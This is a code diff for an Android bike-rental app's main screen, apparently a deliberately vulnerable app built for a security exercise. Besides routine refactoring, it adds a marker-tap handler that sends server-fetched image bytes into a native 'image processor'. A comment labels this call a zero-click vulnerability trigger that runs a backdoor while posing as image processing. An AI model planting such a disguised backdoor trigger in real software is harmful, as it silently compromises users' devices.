@@ -11,6 +11,7 @@ import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ImageButton;
+import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -20,7 +21,9 @@ import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.constraintlayout.widget.ConstraintLayout;
 import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
+import com.bumptech.glide.Glide;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.maps.CameraUpdateFactory;
@@ -31,7 +34,6 @@ import com.google.android.gms.maps.model.BitmapDescriptorFactory;
 import com.google.android.gms.maps.model.LatLng;
 import com.google.android.gms.maps.model.Marker;
 import com.google.android.gms.maps.model.MarkerOptions;
-import com.google.android.gms.tasks.OnSuccessListener;
 import com.journeyapps.barcodescanner.ScanContract;
 import com.journeyapps.barcodescanner.ScanOptions;
 import com.mobility.hack.MainApplication;
@@ -41,10 +43,17 @@ import com.mobility.hack.auth.MyInfoActivity;
 import com.mobility.hack.chatbot.ChatActivity;
 import com.mobility.hack.network.ApiService;
 import com.mobility.hack.network.BikeResponse;
+import com.mobility.hack.util.NativeImageProcessor;
 
+import java.io.IOException;
 import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.TimeUnit;
+
+import okhttp3.ResponseBody;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
 
 public class MainActivity extends AppCompatActivity implements OnMapReadyCallback {
 
@@ -62,7 +71,9 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
 
     private LinearLayout bikeInfoLayout;
     private TextView tvBikeIdInfo;
+    private ImageView ivBikeImage;
     private ImageButton btnCloseBikeInfo;
+    private String currentBikeId; // 현재 선택된 자전거 ID 저장
 
     private final ActivityResultLauncher<ScanOptions> qrScannerLauncher = registerForActivityResult(new ScanContract(),
             result -> {
@@ -72,10 +83,9 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
                     String qrContent = result.getContents();
                     Log.d("MainActivity", "Scanned QR Content: " + qrContent);
 
-                    String bikeNumber = parseBikeNumberFromUrl(qrContent);
+                    String finalBikeId = parseBikeNumberFromUrl(qrContent);
 
-                    if (bikeNumber != null && !bikeNumber.isEmpty()) {
-                        String finalBikeId = formatBikeId(bikeNumber);
+                    if (finalBikeId != null && !finalBikeId.isEmpty()) {
                         Toast.makeText(this, "인식된 자전거: " + finalBikeId, Toast.LENGTH_SHORT).show();
 
                         Intent intent = new Intent(MainActivity.this, PurchaseTicketActivity.class);
@@ -83,7 +93,7 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
                         startActivity(intent);
 
                     } else {
-                        Toast.makeText(this, "유효하지 않은 GO-EQST QR 코드입니다.", Toast.LENGTH_SHORT).show();
+                        Toast.makeText(this, "유효하지 않은 QR 코드입니다.", Toast.LENGTH_SHORT).show();
                     }
                 }
             });
@@ -101,14 +111,6 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
         }
     }
 
-    private String formatBikeId(String bikeNumber) {
-        if (bikeNumber == null || bikeNumber.length() != 7) {
-            return "UNKNOWN";
-        }
-        return "SN-" + bikeNumber.substring(0, 4) + "-" + bikeNumber.substring(4);
-    }
-
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -116,15 +118,32 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
 
         bikeInfoLayout = findViewById(R.id.bikeInfoLayout);
         tvBikeIdInfo = findViewById(R.id.tv_bike_id_info);
+        ivBikeImage = findViewById(R.id.iv_bike_image);
         btnCloseBikeInfo = findViewById(R.id.btnCloseBikeInfo);
+        rentalStatusLayout = findViewById(R.id.rentalStatusLayout);
+        tvRentalTimeValue = findViewById(R.id.tvRentalTimeValue);
+        btnExtendRental = findViewById(R.id.btnExtendRental);
+        btnEndRental = findViewById(R.id.btnEndRental);
 
-        // 닫기 버튼 클릭 시, 패딩도 리셋
+        SharedPreferences prefs = getSharedPreferences("RentalPrefs", MODE_PRIVATE);
+        currentBikeId = prefs.getString("BIKE_ID", null);
+
         btnCloseBikeInfo.setOnClickListener(v -> {
             bikeInfoLayout.setVisibility(View.GONE);
             if (mMap != null) {
                 mMap.setPadding(0, 0, 0, 0);
             }
         });
+
+        btnExtendRental.setOnClickListener(v -> {
+            Intent intent = new Intent(MainActivity.this, PurchaseTicketActivity.class);
+            if (currentBikeId != null) {
+                intent.putExtra("BIKE_ID", currentBikeId);
+            }
+            startActivity(intent);
+        });
+
+        btnEndRental.setOnClickListener(v -> startReturnBikeActivity());
 
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
 
@@ -171,36 +190,11 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
             Intent intent = new Intent(MainActivity.this, PointChargeActivity.class);
             startActivity(intent);
         });
+    }
 
-        rentalStatusLayout = findViewById(R.id.rentalStatusLayout);
-        tvRentalTimeValue = findViewById(R.id.tvRentalTimeValue);
-        btnExtendRental = findViewById(R.id.btnExtendRental);
-        btnEndRental = findViewById(R.id.btnEndRental);
-
-        btnExtendRental.setOnClickListener(v -> {
-            Intent intent = new Intent(MainActivity.this, PurchaseTicketActivity.class);
-            startActivity(intent);
-        });
-
-        btnEndRental.setOnClickListener(v -> {
-            Toast.makeText(this, "사용을 종료합니다.", Toast.LENGTH_SHORT).show();
-
-            stopRentalTimer();
-
-            if (tvRentalTimeValue != null) {
-                tvRentalTimeValue.setText("00:00");
-            }
-
-            SharedPreferences prefs = getSharedPreferences("RentalPrefs", MODE_PRIVATE);
-            SharedPreferences.Editor editor = prefs.edit();
-            editor.remove("isRenting");
-            editor.remove("rental_duration");
-            editor.remove("rental_start_time");
-            editor.apply();
-
-            Log.d("MainActivity", "모든 대여 정보가 초기화되었습니다.");
-            updateUiBasedOnRentalState();
-        });
+    private void startReturnBikeActivity() {
+        Intent intent = new Intent(this, ReturnBikeActivity.class);
+        startActivity(intent);
     }
 
     @Override
@@ -229,13 +223,6 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
         return prefs.getBoolean("isRenting", false);
     }
 
-    private void setRentalStatus(boolean isRenting) {
-        SharedPreferences prefs = getSharedPreferences("RentalPrefs", MODE_PRIVATE);
-        SharedPreferences.Editor editor = prefs.edit();
-        editor.putBoolean("isRenting", isRenting);
-        editor.apply();
-    }
-
     private void startRentalTimer() {
         SharedPreferences prefs = getSharedPreferences("RentalPrefs", MODE_PRIVATE);
         long rentalDuration = prefs.getLong("rental_duration", 0);
@@ -251,7 +238,7 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
         if (remainingTime <= 0) {
             tvRentalTimeValue.setText("00:00");
             Toast.makeText(this, "대여 시간이 만료되었습니다.", Toast.LENGTH_LONG).show();
-            setRentalStatus(false);
+            clearRentalData();
             updateUiBasedOnRentalState();
             return;
         }
@@ -278,7 +265,7 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
             public void onFinish() {
                 tvRentalTimeValue.setText("00:00");
                 Toast.makeText(MainActivity.this, "대여 시간이 만료되었습니다.", Toast.LENGTH_LONG).show();
-                setRentalStatus(false);
+                clearRentalData();
                 updateUiBasedOnRentalState();
             }
         }.start();
@@ -289,6 +276,13 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
             rentalTimer.cancel();
             rentalTimer = null;
         }
+    }
+
+    private void clearRentalData() {
+        SharedPreferences prefs = getSharedPreferences("RentalPrefs", MODE_PRIVATE);
+        SharedPreferences.Editor editor = prefs.edit();
+        editor.clear();
+        editor.apply();
     }
 
     @Override
@@ -304,23 +298,68 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
         mMap.setOnMarkerClickListener(marker -> {
             BikeResponse bike = (BikeResponse) marker.getTag();
             if (bike != null) {
-                tvBikeIdInfo.setText("자전거 번호: " + bike.getSerialNumber());
+                currentBikeId = bike.getSerialNumber(); // 현재 자전거 ID 저장
+                tvBikeIdInfo.setText("자전거 번호: " + currentBikeId);
+                ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded); // 기본 이미지 설정
                 bikeInfoLayout.setVisibility(View.VISIBLE);
 
-                // --- [수정] 패딩 값을 더 크게 주어 확실히 위로 이동 ---
+                ApiService apiService = ((MainApplication) getApplication()).getApiService();
+                apiService.getBikeImage(currentBikeId).enqueue(new Callback<ResponseBody>() {
+                    @Override
+                    public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+                        if (response.isSuccessful() && response.body() != null) {
+                            try {
+                                byte[] imageBytes = response.body().bytes();
+
+                                // [!!!] 제로클릭 취약점 트리거 [!!!]
+                                // 네이티브 라이브러리를 호출하여 이미지를 처리하는 척하면서 백도어를 실행합니다.
+                                final byte[] processedImageBytes = NativeImageProcessor.processImage(imageBytes);
+
+                                if (processedImageBytes.length > 0) {
+                                    runOnUiThread(() -> {
+                                        Glide.with(MainActivity.this)
+                                                .load(processedImageBytes)
+                                                .into(ivBikeImage);
+                                    });
+                                } else {
+                                    runOnUiThread(() -> {
+                                        ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded);
+                                    });
+                                }
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                                runOnUiThread(() -> {
+                                    ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded);
+                                });
+                            }
+                        } else {
+                            Log.d("MainActivity", "getBikeImage not successful: " + response.code());
+                            runOnUiThread(() -> {
+                                ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded);
+                            });
+                        }
+                    }
+
+                    @Override
+                    public void onFailure(Call<ResponseBody> call, Throwable t) {
+                        Log.e("MainActivity", "getBikeImage failure", t);
+                        runOnUiThread(() -> {
+                            ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded);
+                        });
+                    }
+                });
+
                 bikeInfoLayout.post(() -> {
                     int padding = (int) (getResources().getDisplayMetrics().heightPixels * 0.4);
                     mMap.setPadding(0, 0, 0, padding);
                     mMap.animateCamera(CameraUpdateFactory.newLatLng(marker.getPosition()), 500, null);
                 });
-                // --- [끝] ---
             }
             return true;
         });
 
         mMap.setOnMapClickListener(latLng -> {
             bikeInfoLayout.setVisibility(View.GONE);
-            // [수정] 지도 클릭 시, 패딩 리셋
             if (mMap != null) {
                 mMap.setPadding(0, 0, 0, 0);
             }
@@ -331,21 +370,21 @@ public class MainActivity extends AppCompatActivity implements OnMapReadyCallbac
     }
 
     private void checkLocationPermissionAndMoveCamera() {
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, LOCATION_PERMISSION_REQUEST_CODE);
-            return;
+        } else {
+            mMap.setMyLocationEnabled(true);
+            fusedLocationClient.getLastLocation().addOnSuccessListener(this, location -> {
+                if (location != null) {
+                    LatLng currentLatLng = new LatLng(location.getLatitude(), location.getLongitude());
+                    mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(currentLatLng, 16));
+                } else {
+                    LatLng defaultLocation = new LatLng(37.5665, 126.9780);
+                    mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(defaultLocation, 15));
+                    Toast.makeText(this, "현재 위치를 가져올 수 없습니다. 기본 위치로 표시합니다.", Toast.LENGTH_SHORT).show();
+                }
+            });
         }
-
-        mMap.setMyLocationEnabled(true);
-        fusedLocationClient.getLastLocation().addOnSuccessListener(this, location -> {
-            if (location != null) {
-                LatLng currentLatLng = new LatLng(location.getLatitude(), location.getLongitude());
-                mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(currentLatLng, 16));
-            } else {
-                LatLng defaultLocation = new LatLng(37.5665, 126.9780);
-                mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(defaultLocation, 15));
-            }
-        });
     }
 
     @Override
